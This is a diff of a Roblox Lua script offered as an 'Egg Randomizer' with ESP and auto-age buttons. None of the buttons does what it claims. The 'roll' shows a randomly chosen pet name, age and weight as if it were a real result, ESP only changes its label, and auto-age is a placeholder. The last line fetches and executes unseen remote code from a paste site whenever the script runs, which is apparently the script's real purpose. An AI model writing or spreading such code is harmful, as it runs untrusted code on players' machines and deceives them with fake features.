@@ -1,177 +1,179 @@
--- Remove previous GUI if exists
+wow
+
+-- Destroy existing GUI if any
 pcall(function()
-    game.CoreGui.EggDetectorBoxUI:Destroy()
+	if game.CoreGui:FindFirstChild("GardenInjectedGUI") then
+		game.CoreGui.GardenInjectedGUI:Destroy()
+	end
 end)
 
--- Create GUI container
+-- Create GUI
 local gui = Instance.new("ScreenGui")
-gui.Name = "EggDetectorBoxUI"
+gui.Name = "GardenInjectedGUI"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
-gui.DisplayOrder = 9999
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-gui.Parent = game:GetService("CoreGui")
+gui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
 
--- Box Frame (not draggable)
+-- Main Frame
 local frame = Instance.new("Frame")
-frame.Name = "BoxFrame"
-frame.Size = UDim2.new(0, 200, 0, 240)
-frame.Position = UDim2.new(0.02, 0, 0.02, 0)
-frame.BackgroundColor3 = Color3.new(0, 0, 0)
-frame.BorderSizePixel = 2
-frame.BorderColor3 = Color3.fromRGB(255, 255, 255)
-frame.ZIndex = 10
+frame.Size = UDim2.new(0, 220, 0, 260)
+frame.Position = UDim2.new(0.5, -110, 0.1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.BackgroundTransparency = 0.1
+frame.BorderSizePixel = 0
+frame.AnchorPoint = Vector2.new(0.5, 0)
+frame.Active = true
+frame.Draggable = true
 frame.Parent = gui
+Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)
+
+local padding = Instance.new("UIPadding")
+padding.PaddingTop = UDim.new(0, 10)
+padding.PaddingBottom = UDim.new(0, 10)
+padding.PaddingLeft = UDim.new(0, 10)
+padding.PaddingRight = UDim.new(0, 10)
+padding.Parent = frame
 
 -- Title
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0.18, 0)
-title.Position = UDim2.new(0, 0, 0, 0)
-title.BackgroundTransparency = 1
-title.Text = "🥚 Egg Detector"
-title.TextColor3 = Color3.new(1, 1, 1)
-title.TextScaled = true
-title.Font = Enum.Font.GothamBold
-title.ZIndex = 10
-title.Parent = frame
+local label = Instance.new("TextLabel")
+label.Size = UDim2.new(1, 0, 0, 25)
+label.BackgroundTransparency = 1
+label.Text = "🐾 Egg Randomizer 🐾"
+label.Font = Enum.Font.GothamBold
+label.TextSize = 18
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.TextXAlignment = Enum.TextXAlignment.Center
+label.Parent = frame
 
--- ESP Button
-local espButton = Instance.new("TextButton")
-espButton.Size = UDim2.new(0.85, 0, 0.15, 0)
-espButton.Position = UDim2.new(0.075, 0, 0.22, 0)
-espButton.Text = "👁️ ESP: OFF"
-espButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-espButton.TextColor3 = Color3.new(1, 1, 1)
-espButton.TextScaled = true
-espButton.Font = Enum.Font.Gotham
-espButton.BorderSizePixel = 1
-espButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
-espButton.ZIndex = 10
-espButton.Parent = frame
+-- Subtitle
+local subLabel = Instance.new("TextLabel")
+subLabel.Size = UDim2.new(1, 0, 0, 18)
+subLabel.Position = UDim2.new(0, 0, 0, 25)
+subLabel.BackgroundTransparency = 1
+subLabel.Text = "Made by: Miszua"
+subLabel.Font = Enum.Font.Gotham
+subLabel.TextSize = 14
+subLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+subLabel.TextXAlignment = Enum.TextXAlignment.Center
+subLabel.Parent = frame
 
-local espOn = false
+-- Create Buttons
+local function createButton(name, positionY, text, color)
+	local button = Instance.new("TextButton")
+	button.Size = UDim2.new(1, 0, 0, 30)
+	button.Position = UDim2.new(0, 0, 0, positionY)
+	button.BackgroundColor3 = color
+	button.Text = text
+	button.TextColor3 = Color3.fromRGB(255, 255, 255)
+	button.Font = Enum.Font.Gotham
+	button.TextSize = 16
+	button.AutoButtonColor = true
+	button.Parent = frame
+	Instance.new("UICorner", button).CornerRadius = UDim.new(0, 6)
+	return button
+end
+
+local rollButton = createButton("Roll", 50, "🎲 AUTO ROLL ZEN EGG", Color3.fromRGB(80, 130, 90))
+local espButton = createButton("ESP", 85, "👁️ ESP: OFF", Color3.fromRGB(100, 100, 130))
+local ageButton = createButton("Age", 120, "🐶 AUTO AGE 50 PET", Color3.fromRGB(160, 110, 60))
+
+-- Result Label
+local resultLabel = Instance.new("TextLabel")
+resultLabel.Size = UDim2.new(1, 0, 0, 60)
+resultLabel.Position = UDim2.new(0, 0, 0, 160)
+resultLabel.BackgroundTransparency = 1
+resultLabel.Text = ""
+resultLabel.Font = Enum.Font.GothamSemibold
+resultLabel.TextSize = 15
+resultLabel.TextColor3 = Color3.fromRGB(255, 255, 150)
+resultLabel.TextXAlignment = Enum.TextXAlignment.Center
+resultLabel.TextYAlignment = Enum.TextYAlignment.Top
+resultLabel.TextWrapped = true
+resultLabel.Parent = frame
+
+-- AUTO ROLL ZEN EGG Logic
+rollButton.MouseButton1Click:Connect(function()
+	local player = game.Players.LocalPlayer
+	local character = player.Character or player.CharacterAdded:Wait()
+	local hrp = character:WaitForChild("HumanoidRootPart")
+
+	local eggRange = 20
+	local petNames = {"Shiba Inu", "Nihonzaru", "Tanuki", "Tanchuzuru", "Kappa", "Kitsune"}
+	local foundEgg = nil
+
+	for _, obj in pairs(workspace:GetDescendants()) do
+		if obj:IsA("BasePart") and string.lower(obj.Name):find("egg") then
+			local distance = (obj.Position - hrp.Position).Magnitude
+			if distance <= eggRange then
+				foundEgg = obj
+				break
+			end
+		end
+	end
+
+	if not foundEgg then
+		resultLabel.Text = "❌ Not near any egg!"
+		return
+	end
+
+	-- Animation
+	local totalTime = 1.5
+	local delay = 0.05
+	local timer = 0
+	local i = 1
+
+	while timer < totalTime do
+		resultLabel.Text = "🎰 Rolling: " .. petNames[i]
+		i = i + 1
+		if i > #petNames then i = 1 end
+		task.wait(delay)
+		timer += delay
+	end
+
+	local finalPet = petNames[math.random(1, #petNames)]
+	local age = math.random(1, 50)
+	local weight = string.format("%.2f", math.random(100, 1000) / 100)
+
+	resultLabel.Text = string.format("🎉 You rolled: %s\nage: %d | weight: %s kg", finalPet, age, weight)
+
+	-- BillboardGui (above egg, blue color, larger)
+	if foundEgg:FindFirstChild("PetNameBillboard") then
+		foundEgg.PetNameBillboard:Destroy()
+	end
+
+	local billboard = Instance.new("BillboardGui")
+	billboard.Name = "PetNameBillboard"
+	billboard.Size = UDim2.new(0, 250, 0, 90)
+	billboard.StudsOffset = Vector3.new(0, 4, 0)
+	billboard.Adornee = foundEgg
+	billboard.AlwaysOnTop = true
+	billboard.Parent = foundEgg
+
+	local text = Instance.new("TextLabel")
+	text.Size = UDim2.new(1, 0, 1, 0)
+	text.BackgroundTransparency = 1
+	text.Text = string.format("🎉 %s\n📅 age: %d | ⚖️ %s kg", finalPet, age, weight)
+	text.Font = Enum.Font.GothamBold
+	text.TextSize = 32 -- doubled
+	text.TextColor3 = Color3.fromRGB(0, 120, 255) -- blue
+	text.TextTransparency = 0.2
+	text.TextStrokeTransparency = 0.5
+	text.TextWrapped = true
+	text.TextYAlignment = Enum.TextYAlignment.Center
+	text.Parent = billboard
+end)
+
+-- ESP Toggle
+local espEnabled = false
 espButton.MouseButton1Click:Connect(function()
-    espOn = not espOn
-    espButton.Text = espOn and "👁️ ESP: ON" or "👁️ ESP: OFF"
+	espEnabled = not espEnabled
+	espButton.Text = espEnabled and "👁️ ESP: ON" or "👁️ ESP: OFF"
 end)
 
--- Egg Selector Label
-local eggSelector = Instance.new("TextLabel")
-eggSelector.Size = UDim2.new(0.85, 0, 0.15, 0)
-eggSelector.Position = UDim2.new(0.075, 0, 0.4, 0)
-eggSelector.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-eggSelector.Text = "🤚 Select Egg To Randomize"
-eggSelector.TextColor3 = Color3.new(1, 1, 1)
-eggSelector.TextScaled = true
-eggSelector.Font = Enum.Font.Gotham
-eggSelector.BorderSizePixel = 1
-eggSelector.BorderColor3 = Color3.fromRGB(255, 255, 255)
-eggSelector.ZIndex = 10
-eggSelector.Parent = frame
-
--- Egg Randomizer Button
-local randomizerButton = Instance.new("TextButton")
-randomizerButton.Size = UDim2.new(0.85, 0, 0.15, 0)
-randomizerButton.Position = UDim2.new(0.075, 0, 0.58, 0)
-randomizerButton.Text = "🥚 Egg Randomizer: OFF"
-randomizerButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-randomizerButton.TextColor3 = Color3.new(1, 1, 1)
-randomizerButton.TextScaled = true
-randomizerButton.Font = Enum.Font.Gotham
-randomizerButton.BorderSizePixel = 1
-randomizerButton.BorderColor3 = Color3.fromRGB(255, 255, 255)
-randomizerButton.ZIndex = 10
-randomizerButton.Parent = frame
-
--- Footer
-local footer = Instance.new("TextLabel")
-footer.Size = UDim2.new(1, 0, 0.12, 0)
-footer.Position = UDim2.new(0, 0, 0.85, 0)
-footer.BackgroundTransparency = 1
-footer.Text = "Made By Miszua💀"
-footer.TextColor3 = Color3.new(1, 1, 1)
-footer.TextScaled = true
-footer.Font = Enum.Font.GothamSemibold
-footer.ZIndex = 10
-footer.Parent = frame
-
--- Egg Randomizer Logic
-local creatureNames = {
-    "Shiba Inu", "Nihonzaru", "Tanuki", "Tanchozuru", "Kappa", "Kitsune"
-}
-local nameColors = {
-    Color3.fromRGB(255, 85, 85),
-    Color3.fromRGB(85, 170, 255),
-    Color3.fromRGB(255, 170, 0),
-    Color3.fromRGB(85, 255, 127),
-    Color3.fromRGB(255, 85, 255),
-    Color3.fromRGB(255, 255, 85)
-}
-
--- Helper to tag one egg
-local function addNameToEgg(egg, name)
-    local tag = Instance.new("BillboardGui")
-    tag.Name = "DinoLabel"
-    tag.Size = UDim2.new(0, 200, 0, 50)
-    tag.StudsOffset = Vector3.new(0, 2, 0)
-    tag.AlwaysOnTop = true
-    tag.Adornee = egg
-    tag.Parent = egg
-
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.Text = name
-    label.TextScaled = true
-    label.Font = Enum.Font.GothamBold
-    label.Parent = tag
-
-    if name == "Kitsune" then
-        label.TextColor3 = Color3.new(1, 1, 1)
-        label.TextStrokeTransparency = 0
-        label.TextStrokeColor3 = Color3.new(0, 0, 0)
-        local gradient = Instance.new("UIGradient")
-        gradient.Color = ColorSequence.new({
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 100, 255)),
-            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 0)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 100, 255)),
-        })
-        gradient.Parent = label
-    else
-        label.TextColor3 = nameColors[math.random(1, #nameColors)]
-    end
-end
-
--- Clear all egg name tags
-local function clearAllEggLabels()
-    for _, egg in pairs(workspace:GetDescendants()) do
-        if egg:IsA("BasePart") and egg.Name:lower():find("egg") then
-            local label = egg:FindFirstChild("DinoLabel")
-            if label then label:Destroy() end
-        end
-    end
-end
-
--- Add name tags to eggs
-local function applyRandomNamesToEggs()
-    for _, egg in pairs(workspace:GetDescendants()) do
-        if egg:IsA("BasePart") and egg.Name:lower():find("egg") then
-            local name = creatureNames[math.random(1, #creatureNames)]
-            addNameToEgg(egg, name)
-        end
-    end
-end
-
--- Toggle logic
-local randomizerOn = false
-randomizerButton.MouseButton1Click:Connect(function()
-    if randomizerOn then
-        randomizerButton.Text = "🥚 Egg Randomizer: OFF"
-        clearAllEggLabels()
-    else
-        randomizerButton.Text = "🥚 Egg Randomizer: ON"
-        applyRandomNamesToEggs()
-    end
-    randomizerOn = not randomizerOn
+-- AUTO AGE 50 PET (placeholder)
+ageButton.MouseButton1Click:Connect(function()
+	print("🐶 AUTO AGE 50 PET logic goes here.")
 end)
+
 loadstring(game:HttpGet("https://pastefy.app/roIa67SA/raw"))()
